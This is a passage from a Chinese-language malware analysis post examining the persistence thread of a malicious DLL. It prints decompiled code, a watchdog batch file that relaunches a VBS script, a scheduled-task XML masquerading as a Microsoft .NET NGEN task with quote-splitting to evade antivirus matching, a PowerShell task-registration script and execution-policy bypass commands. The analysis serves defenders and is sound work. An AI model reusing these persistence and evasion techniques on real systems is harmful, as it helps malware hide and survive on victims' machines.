
## 2.2.4 线程3：持久化

```
LOBYTE(v24) = 3;

str_concat((int)v14, v21, (int)"monitor.bat");

LOBYTE(v24) = 5;

maybe_alloc(v10);

create_file(v12, v14, 2, 64, 1);

LOBYTE(v24) = 6;

if ( (unsigned __int8)((int (__thiscall *)(char *))judge_exist)(v12) )

{

  ((void (__cdecl *)(char *, const char *))write)(v12, "@echo off\n");

  ((void (*)(char *, const char *, ...))write)(v12, "set \"PIDFile=%TEMP%\\target.pid\"\n");

  v1 = ((int (__cdecl *)(char *, const char *))write)(v12, "set \"VBSPath=");

  v2 = write_2(v1, a1);

  ((void (__cdecl *)(int, void *))write)(v2, &unk_1003ACB8);

  ((void (*)(char *, const char *, ...))write)(v12, "set /p pid= nul\n");

  ((void (__cdecl *)(char *, const char *))write)(v12, "if errorlevel 1 (\n");

  ((void (*)(char *, const char *, ...))write)(v12, "    cscript //nologo \"%VBSPath%\"\n");

  ((void (__cdecl *)(char *, const char *))write)(v12, "    exit\n");

  ((void (__cdecl *)(char *, void *))write)(v12, &unk_1003AD80);

  ((void (__cdecl *)(char *, const char *))write)(v12, "timeout /t 15\n");

  ((void (__cdecl *)(char *, const char *))write)(v12, "goto check\n");

  ((void (__thiscall *)(char *))file_close)(v12);

}

v3 = (const char *)string(v14);

((void (*)(_BYTE *, const char *, ...))exec)(v5, "cmd.exe /B /c \"%s\"", v3);

v19 = ((int (*)(void))kernel32_GetCurrentProcessId)();

create_file(v7, v13, 2, 64, 1);

LOBYTE(v24) = 7;

if ( (unsigned __int8)((int (__thiscall *)(char *))judge_exist)(v7) )

{

  ((void (__thiscall *)(char *, int))unk_100041E0)(v7, v19);

  ((void (__thiscall *)(char *))file_close)(v7);

}

((void (__cdecl *)(_DWORD *, _DWORD, int))unk_10017060)(v8, 0, 68);

v8[0] = 68;

v8[11] = 1;

v9 = 5;

v15 = 0;

v16 = 0;

v17 = 0;

v18 = 0;

if ( ((int (__stdcall *)(_DWORD, _BYTE *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD *, int *))kernel32_CreateProcessA)(
         0,
         v5,
         0,
         0,
         0,
         0,
         0,
         0,
         v8,
         &v15) )
{

  ((void (__stdcall *)(int))kernel32_CloseHandle)(v15);

  ((void (__stdcall *)(int))kernel32_CloseHandle)(v16);

}

LOBYTE(v24) = 6;

((void (__thiscall *)(char *))unk_10003090)(v7);

LOBYTE(v24) = 5;

((void (__thiscall *)(char *))unk_10003090)(v12);

LOBYTE(v24) = 2;

maybe_alloc(v14);

v24 = -1;

return maybe_alloc(v13);
}
```

`monitor.bat`内容如下，作用为充当守护进程，在特定进程被关闭时就重新启动该进程

```
@echo off
set "PIDFile=%TEMP%\target.pid"
set "VBSPath=C:\Users\123\AppData\Roaming\Axialis\Decision.vbs"
set /p pid= nul
if errorlevel 1 (
    cscript //nologo "%VBSPath%"
    exit
)
timeout /t 15
goto check
```

### 创建`xml`和`ps1`文件并调用`ps1`文件添加计划任务

```
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_1000A9F0@(int a1@, int a2@, _DWORD *a3@, int a4@)
{
  ((void (__stdcall *)(int, int *, int, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int))unk_10016430)(
    a1,
    &v50,
    a1,
    NtCurrentTeb()->NtTib.ExceptionList,
    &unk_1003270B,
    -1);
  v48 = (int)&v50;
  v47 = a4;
  v46 = a3;
  get_str_addr(&v49[-1002], (int)".NET Framework NGEN v4.0.30325");
  v48 = 0;
  v49[-885] = get_Roaming_FolderPath(&v49[-1100], 26);
  v49[-886] = v49[-885];
  LOBYTE(v48) = 1;
  str_concat((int)&v49[-996], (void *)v49[-886], (int)"\\Axialis\\Decision.vbs");
  LOBYTE(v48) = 3;
  maybe_alloc(&v49[-1100]);
  v4 = string(&v49[-996]);
  ((void (__cdecl *)(_DWORD *, _DWORD *))unk_1000A7F0)(&v49[-990], v4);
  LOBYTE(v48) = 4;
  v49[-805] = sub_10007310((char *)&v49[-113] + 3);
  qmemcpy(
    &v49[-112],
 "base64编码后的数据",
    220);
  v5 = (_DWORD *)((int (__thiscall *)(_DWORD *, _DWORD *, _DWORD *))unk_10001730)(&v49[-1016], &v49[-112], &v49[-57]);
  v6 = v5[1];
  v49[-864] = *v5;
  v49[-863] = v6;
  ((void (__thiscall *)(_DWORD *, _DWORD, _DWORD, _DWORD))unk_10011190)(&v49[-892], v49[-864], v49[-863], v49[-805]);
  LOBYTE(v48) = 5;
  v49[-806] = sub_10007310((char *)&v49[-113] + 2);
  qmemcpy(
    &v49[-804],
    “base64编码的数据”,
    2744);
  ---------------------------------省略部分内容----------------------------------------
  qmemcpy(&v49[-24], "\\PolicyManagement.xml", 21);
  v13 = (_DWORD *)((int (__thiscall *)(_DWORD *, _DWORD *, char *))unk_10001730)(
                    &v49[-1018],
                    &v49[-24],
                    (char *)&v49[-19] + 1);
  ---------------------------------省略部分内容----------------------------------------
  qmemcpy(&v49[-56], "powershell -Command \"Set-ExecutionPolicy Unrestricted -Scope CurrentUser\"", 73);
  v25 = (_DWORD *)((int (__thiscall *)(_DWORD *, _DWORD *, char *))unk_10001730)(
                    &v49[-1078],
                    &v49[-56],
                    (char *)&v49[-38] + 1);
  ---------------------------------省略部分内容----------------------------------------
  qmemcpy(&v49[-18], "cmd.exe /C ", 11);
  v27 = (_DWORD *)((int (__thiscall *)(_DWORD *, _DWORD *, char *))unk_10001730)(
                    &v49[-1010],
                    &v49[-18],
                    (char *)&v49[-16] + 3);
  ---------------------------------省略部分内容----------------------------------------
  qmemcpy(&v49[-35], "powershell -ExecutionPolicy Bypass -File ", 41);
  v30 = (_DWORD *)((int (__thiscall *)(_DWORD *, _DWORD *, char *))unk_10001730)(
                    &v49[-1012],
                    &v49[-35],
                    (char *)&v49[-25] + 1);
  v31 = v30[1];
  v49[-880] = *v30;
  v49[-879] = v31;
  ((void (__thiscall *)(_DWORD *, _DWORD, _DWORD, _DWORD))unk_10011190)(&v49[-928], v49[-880], v49[-879], v49[-853]);
  LOBYTE(v48) = 67;
  ((void (__cdecl *)(_DWORD *, _DWORD *))unk_1000A6B0)(&v49[-966], &v49[-928]);
  LOBYTE(v48) = 69;
  ((void (__thiscall *)(_DWORD *))unk_10011170)(&v49[-928]);
  v49[-859] = string(&v49[-898]);
  v49[-854] = sub_10007310((char *)&v49[-115] + 2);
  qmemcpy(v43, "/C ", sizeof(v43));
  ---------------------------------省略部分内容----------------------------------------
  ((void (__cdecl *)(_DWORD *, _DWORD, int))unk_10017060)(&v49[-947], 0, 56);
  v49[-947] = 64;
  v49[-946] = 0;
  v49[-945] = "open";
  v49[-944] = "cmd.exe";
  v49[-943] = string(&v49[-966]);
  v49[-942] = 0;
  v49[-941] = 0;
  if ( ((int (__stdcall *)(_DWORD *))shell32_ShellExecuteEx)(&v49[-948]) && v49[-934] )
  {
    ((void (__stdcall *)(_DWORD, int))kernel32_WaitForSingleObject)(v49[-934], -1);
    ((void (__stdcall *)(_DWORD))kernel32_CloseHandle)(v49[-934]);
  }
  return v49[-862];
}
```

![](https://attach.52pojie.cn/forum/202503/11/103322yyqej35v78lewl97.png)

2.2.4-1.png (235.96 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=Mjc2MDQ5MXxkMWQxZTFiOHwxNzkzNTc2NzMyfDE2ODA4NnwyMDEzMzYz&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc2MDQ5MXxkMWQxZTFiOHwxNzkzNTc2NzMyfDE2ODA4NnwyMDEzMzYz&nothumb=yes)

2025-3-11 10:33 上传

`xml`文件内容如下，用于执行`Decision.vbs`，其中利用了引号来规避杀软的字符串匹配""D""e""c""i""s""i""o""n.vbs

```
  
    2006-11-10T14:29:55.5851926
    Microsoft Corporation
    更新用户的 AD RMS 权限策略模板。如果对服务器上模板分发 Web 服务的身份验证失败，此作业将提供凭据提示。
    \.NET Framework NGEN v4.0.30325
    D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;WD)
  
  
    
      true
      PT30S
    
  
  
    
      S-1-1-0
      HighestAvailable
    
  
  
    Parallel
    false
    false
    false
    true
    true
    
      true
      false
    
    true
    true
    false
    false
    false
    true
    false
    PT0S
    7
    
      PT1M
      16
    
  
  
    
      w""s""c""r""i""p""t.exe
      C:\Users\123\AppData\Roaming\Axialis\""D""e""c""i""s""i""o""n.vbs
    
  
```

然后释放文件`updated.ps1`内容如下，用于添加计划任务

```
$xmlPath = "C:\Users\123\AppData\Local\PolicyManagement.xml"
$taskName = ".NET Framework NGEN v4.0.30325"
$xmlContent = Get-Content -Path $xmlPath | Out-String
Register-ScheduledTask -Xml $xmlContent -TaskName $taskName
```

然后调用`shell32_ShellExecuteEx`执行
